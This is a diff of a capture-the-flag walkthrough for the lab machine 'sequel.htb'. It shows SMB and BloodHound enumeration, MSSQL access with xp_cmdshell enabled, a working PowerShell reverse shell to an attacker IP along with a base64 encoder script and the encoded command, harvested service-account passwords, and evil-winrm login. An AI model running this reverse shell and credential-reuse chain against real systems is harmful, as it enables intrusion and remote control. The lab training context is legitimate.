@@ -10,7 +10,7 @@ date: 2025-03-13T00:00:00Z
 ![](Pasted%20image%2020250313225715.png)
 
 >[!Info]
- As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose / KxEPkKe6R8su`
+>As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose / KxEPkKe6R8su`
 
 ## Reconnaissance
 
@@ -86,6 +86,8 @@ Host script results:
 |   date: 2025-03-13T22:01:45
 |_  start_date: N/A
 ```
+
+## Enumeration
 
 I'll test SMB with nxc and without credentials:
 
@@ -190,4 +192,123 @@ smb: \> dir
 If we inspect the content of `accounts.xlsx` we find some credentials:
 
 ![](Pasted%20image%2020250313232739.png)
+
+Now I'll ingest data o tained to **bloodhound**:
+
+```shell
+bloodhound-python -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -u rose -p KxEPkKe6R8su -c all --zip
+```
+
+I'll paste the generated zip into **bloodhound**:
+
+![](Pasted%20image%2020250316205358.png)
+
+Now I'll enter the mssql with the username `sa` and try to get a shell:
+
+```shell
+impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
+
+enable_xp_cmdshell
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+![](Pasted%20image%2020250316210903.png)
+
+## Exploitation
+
+So I'll generate a reverse shell
+- Got the content from [Mayfly227](https://mayfly277.github.io/posts/GOADv2-pwning-part7/#command-execution-to-shell) -> ==INSANE BLOG==
+
+```shell
+$c = New-Object System.Net.Sockets.TCPClient('10.10.14.30',666);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb = (iex $d 2>&1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+    $s.Write($sb,0,$sb.Length);
+    $s.Flush()
+};
+$c.Close()
+```
+
+Encode it in base64 using the following script:
+
+```python
+#!/usr/bin/env python
+import base64
+import sys
+
+if len(sys.argv) < 3:
+  print('usage : %s ip port' % sys.argv[0])
+  sys.exit(0)
+
+payload="""
+$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
+$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb = (iex $d 2>&1 | Out-String );
+    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
+    $s.Write($sb,0,$sb.Length);
+    $s.Flush()
+};
+$c.Close()
+""" % (sys.argv[1], sys.argv[2])
+
+byte = payload.encode('utf-16-le')
+b64 = base64.b64encode(byte)
+print("powershell -exec bypass -enc %s" % b64.decode())
+```
+
+```shell
+powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEAMAAuADEANAAuADMAMAAnACwANgA2ADYAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
+```
+
+### User flag
+
+Enumerating the machine I found `sqlsvc`'s credentials inside `C:\SQL2019\ExpressAdv_ENU`:
+
+```shell
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+```
+
+Now I'll log in with **evil-winrm** and found that user `ryan` is reusing the password:
+
+```shell
+evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
+```
+
+![](Pasted%20image%2020250316213317.png)
+
+## Privilege Escalation
+
+Now in **bloodhound** I'll select **Shortest Paths >> Shortest paths from Owned Principals >> Ryan**.
 
